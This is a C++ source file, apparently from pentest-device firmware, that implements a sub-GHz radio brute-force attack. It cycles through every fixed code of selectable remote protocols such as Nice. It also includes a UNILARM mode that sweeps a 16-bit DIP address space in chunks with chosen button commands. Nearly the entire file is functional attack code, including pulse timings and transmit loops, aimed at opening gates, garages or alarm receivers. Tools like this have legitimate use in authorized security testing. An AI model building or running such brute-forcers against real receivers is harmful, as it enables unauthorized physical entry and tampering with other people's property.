#include "rf_bruteforce.h"
#include "rf_utils.h"
#include "core/lang/zh_font.h"

static float brute_frequency = 433.92;
static int brute_protocol_idx = 1; // Default: Nice
static int brute_repeats = 1;
static int brute_bits = 0; // 0 = use protocol default bit width

static void rf_brute_frequency() {
    options = {};
    int ind = 0;
    int arraySize = sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]);
    for (int i = 0; i < arraySize; i++) {
        String tmp = String(subghz_frequency_list[i], 2) + "MHz";
        options.push_back({tmp.c_str(), [=]() { brute_frequency = subghz_frequency_list[i]; }});
        if (int(brute_frequency * 100) == int(subghz_frequency_list[i] * 100)) ind = i;
    }
    loopOptions(options, ind);
}

static void rf_brute_protocol() {
    options = {};
    for (int i = 0; i < BRUTE_PROTOCOL_COUNT; i++) {
        options.push_back({brute_protocols[i].name, [=]() { brute_protocol_idx = i; }});
    }
    loopOptions(options, brute_protocol_idx);
}

static void rf_brute_repeats() {
    options = {};
    for (int i = 1; i <= 5; i++) {
        options.push_back({String(i).c_str(), [=]() { brute_repeats = i; }});
    }
    loopOptions(options, brute_repeats - 1);
}

static void rf_brute_bits() {
    const BruteProtocol &proto = brute_protocols[brute_protocol_idx];
    int cur = (brute_bits > 0 && brute_bits <= proto.bits) ? brute_bits : proto.bits;
    options = {};
    int ind = 0;
    for (int b = 4; b <= proto.bits; b++) {
        options.push_back({(String(b) + "bit").c_str(), [=]() { brute_bits = b; }});
        if (b == cur) ind = int(options.size()) - 1;
    }
    loopOptions(options, ind);
}

static inline void sendPulse(int txpin, int duration) {
    if (duration > 0) {
        digitalWrite(txpin, HIGH);
        delayMicroseconds(duration);
    } else if (duration < 0) {
        digitalWrite(txpin, LOW);
        delayMicroseconds(-duration);
    }
}

static bool rf_brute_start() {
    int txpin;

    if (bruceConfigPins.rfModule == CC1101_SPI_MODULE) {
        txpin = bruceConfigPins.CC1101_bus.io0;
        if (!initRfModule("tx", brute_frequency)) return false;
    } else {
        txpin = bruceConfigPins.rfTx;
        if (!initRfModule("tx")) return false;
    }

    const BruteProtocol &proto = brute_protocols[brute_protocol_idx];
    const int bits = (brute_bits > 0 && brute_bits <= proto.bits) ? brute_bits : proto.bits;
    const uint32_t total = 1UL << bits;

    pinMode(txpin, OUTPUT);
    setMHZ(brute_frequency);

    for (uint32_t code = 0; code < total; ++code) {
        for (int r = 0; r < brute_repeats; ++r) {
            // Pilot/sync period
            if (proto.pilot[0] || proto.pilot[1]) {
                sendPulse(txpin, proto.pilot[0]);
                sendPulse(txpin, proto.pilot[1]);
            }

            // Data bits (MSB first)
            for (int j = bits - 1; j >= 0; --j) {
                const int *timings = ((code >> j) & 1) ? proto.one : proto.zero;
                sendPulse(txpin, timings[0]);
                sendPulse(txpin, timings[1]);
            }

            // Stop bit
            if (proto.stop[0] || proto.stop[1]) {
                sendPulse(txpin, proto.stop[0]);
                sendPulse(txpin, proto.stop[1]);
            }
        }

        if (check(EscPress)) break;

        if (code % 100 == 0) {
            displayRedStripe(
                String(code, HEX) + "/" + String(total, HEX) + " " + proto.name,
                getComplementaryColor2(bruceConfig.priColor),
                bruceConfig.priColor
            );
        }
    }

    digitalWrite(txpin, LOW);
    deinitRfModule();
    return true;
}

void rf_bruteforce() {
    while (true) {
        const BruteProtocol &proto = brute_protocols[brute_protocol_idx];
        int eff_bits = (brute_bits > 0 && brute_bits <= proto.bits) ? brute_bits : proto.bits;
        int option = 0;
        options = {
            {"Start", [&]() { option = 5; }},
            {bruceTranslate("Frequency: ") + String(brute_frequency, 2), [&]() { option = 1; }},
            {bruceTranslate("Protocol: ") + proto.name, [&]() { option = 2; }},
            {bruceTranslate("Bits: ") + String(eff_bits) + "/" + String(proto.bits),
             [&]() { option = 3; }},
            {bruceTranslate("Repeats: ") + String(brute_repeats), [&]() { option = 4; }},
            {"Main Menu", [&]() { option = 6; }},
        };
        loopOptions(options);

        switch (option) {
            case 1: rf_brute_frequency(); break;
            case 2: rf_brute_protocol(); break;
            case 3: rf_brute_bits(); break;
            case 4: rf_brute_repeats(); break;
            case 5: rf_brute_start(); break;
            case 6: return;
            default: return; // EscPress
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

// ---------------------------------------------------------------------------
// UNILARM (25 bit fixed code: 16 bit DIP address + 9 bit button instruction)
// Pulse shape from community measurements: TE = 209us
//   bit 0 -> HIGH 150us, LOW 650us
//   bit 1 -> HIGH 550us, LOW 250us
// Address space is swept in 4096-code chunks so a full pass can be split
// over several runs (~5 min per chunk at 4 repeats).
// ---------------------------------------------------------------------------
static const uint32_t UNILARM_CHUNK = 4096;
static const uint32_t UNILARM_MAX_ADDR = 65535;

static float ul_frequency = 433.92;
static int ul_button_idx = 0;
static int ul_chunk_idx = 0;
static int ul_repeats = 4;

static const uint16_t unilarm_buttons[] = {
    0b110000000, // button 1 (documented)
    0b001100000, // button 2 (documented)
    0b000000000, // all zero
    0b111111111, // all one
};
static const char *unilarm_button_names[] = {
    "Btn1 1 1000 0000", "Btn2 0011 0000 0", "All0 0000 0000", "All1 1111 1111",
};

static void ul_choose_frequency() {
    options = {};
    int ind = 0;
    int arraySize = sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]);
    for (int i = 0; i < arraySize; i++) {
        String tmp = String(subghz_frequency_list[i], 2) + "MHz";
        options.push_back({tmp.c_str(), [=]() { ul_frequency = subghz_frequency_list[i]; }});
        if (int(ul_frequency * 100) == int(subghz_frequency_list[i] * 100)) ind = i;
    }
    loopOptions(options, ind);
}

static void ul_choose_button() {
    options = {};
    for (size_t i = 0; i < sizeof(unilarm_buttons) / sizeof(unilarm_buttons[0]); i++) {
        options.push_back({unilarm_button_names[i], [=]() { ul_button_idx = int(i); }});
    }
    loopOptions(options, ul_button_idx);
}

static void ul_choose_chunk() {
    options = {};
    int chunks = int((UNILARM_MAX_ADDR + 1) / UNILARM_CHUNK);
    for (int i = 0; i < chunks; i++) {
        uint32_t from = i * UNILARM_CHUNK;
        uint32_t to = from + UNILARM_CHUNK - 1;
        String tmp = String(from, HEX) + "-" + String(to, HEX);
        options.push_back({tmp.c_str(), [=]() { ul_chunk_idx = i; }});
    }
    loopOptions(options, ul_chunk_idx);
}

static void ul_choose_repeats() {
    options = {};
    for (int i = 1; i <= 5; i++) {
        options.push_back({String(i).c_str(), [=]() { ul_repeats = i; }});
    }
    loopOptions(options, ul_repeats - 1);
}

static void ul_send_frame(int txpin, uint32_t frame) {
    for (int j = 24; j >= 0; --j) {
        if ((frame >> j) & 1) {
            sendPulse(txpin, 550);
            sendPulse(txpin, -250);
        } else {
            sendPulse(txpin, 150);
            sendPulse(txpin, -650);
        }
    }
    sendPulse(txpin, -4000); // inter-frame gap
}

static bool ul_start() {
    if (bruceConfigPins.rfModule != CC1101_SPI_MODULE && bruceConfigPins.rfTx < 0) {
        displayError("No RF TX pin configured");
        return false;
    }

    int txpin;
    if (bruceConfigPins.rfModule == CC1101_SPI_MODULE) {
        txpin = bruceConfigPins.CC1101_bus.io0;
        if (!initRfModule("tx", ul_frequency)) return false;
    } else {
        txpin = bruceConfigPins.rfTx;
        if (!initRfModule("tx")) return false;
    }

    const uint32_t base = uint32_t(ul_chunk_idx) * UNILARM_CHUNK;
    const uint32_t limit = min(base + UNILARM_CHUNK, UNILARM_MAX_ADDR + 1);
    const uint16_t instr = unilarm_buttons[ul_button_idx];

    pinMode(txpin, OUTPUT);
    setMHZ(ul_frequency);

    for (uint32_t addr = base; addr < limit; ++addr) {
        const uint32_t frame = (addr << 9) | instr;
        for (int r = 0; r < ul_repeats; ++r) { ul_send_frame(txpin, frame); }

        if (check(EscPress)) break;
        if (addr % 50 == 0) {
            displayRedStripe(
                String(addr, HEX) + "/" + String(limit, HEX) + " UNILARM",
                getComplementaryColor2(bruceConfig.priColor),
                bruceConfig.priColor
            );
        }
    }

    digitalWrite(txpin, LOW);
    deinitRfModule();
    return true;
}

void rf_unilarm() {
    while (true) {
        int option = 0;
        options = {
            {"Start", [&]() { option = 5; }},
            {bruceTranslate("Frequency: ") + String(ul_frequency, 2), [&]() { option = 1; }},
            {bruceTranslate("Button: ") + String(unilarm_button_names[ul_button_idx]),
             [&]() { option = 2; }},
            {bruceTranslate("Address: ") + String(ul_chunk_idx * UNILARM_CHUNK, HEX) + "-" +
                 String(ul_chunk_idx * UNILARM_CHUNK + UNILARM_CHUNK - 1, HEX),
             [&]() { option = 3; }},
            {bruceTranslate("Repeats: ") + String(ul_repeats), [&]() { option = 4; }},
            {"Main Menu", [&]() { option = 6; }},
        };
        loopOptions(options);

        switch (option) {
            case 1: ul_choose_frequency(); break;
            case 2: ul_choose_button(); break;
            case 3: ul_choose_chunk(); break;
            case 4: ul_choose_repeats(); break;
            case 5: ul_start(); break;
            case 6: return;
            default: return;
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}
